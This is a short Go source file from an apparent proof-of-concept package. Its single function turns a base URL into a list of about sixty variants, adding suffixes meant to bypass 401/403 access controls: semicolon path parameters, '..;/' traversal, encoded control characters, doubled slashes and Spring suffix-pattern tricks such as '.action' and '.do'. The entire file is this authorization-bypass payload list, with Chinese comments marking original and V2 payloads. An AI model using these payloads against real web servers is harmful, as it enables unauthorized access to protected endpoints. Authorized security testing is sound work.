package poc

func GenerateURLs(baseURL string) []string {
	suffixes := []string{
		// 原有 payload
		";.rand",
		".rand",
		";.js",
		";.css",
		";.html",
		";.tmpl",
		".json",
		".js",
		".css",
		".html",
		".tmpl",
		"/",
		"/%20/",
		"/%3b",
		"/;",
		"..;/",
		"/12123123123123.jsp",
		";/12123123123123.jsp",
		"/12123123123123.js",
		";/12123123123123.js",
		";123.jsp",
		// V2 新增: 更多后缀绕过
		".php",
		".svc",
		".wsdl",
		";.php",
		";.svc",
		";.wsdl",
		// Spring suffix pattern match 绕过（ref: 401 & 403 Bypass）
		// Spring 旧版默认启用后缀模式匹配，/admin.action 会匹配 /admin
		".action",
		".do",
		".htm",
		";.action",
		";.do",
		";.htm",
		"..",
		"/.",
		"/./",
		"//",
		"///",
		"/*",
		"/%09/",
		"/%00",
		"/%0a",
		"/%0d",
		"/%23",
		"/%25",
		"/..",
		"/..;/",
		"/..%3b/",
		".;\\..",
		";/",
		".;/",
		";x/",
		";foo=bar/",
	}

	urls := make([]string, len(suffixes))

	for i, suffix := range suffixes {
		urls[i] = baseURL + suffix
	}

	return urls
}
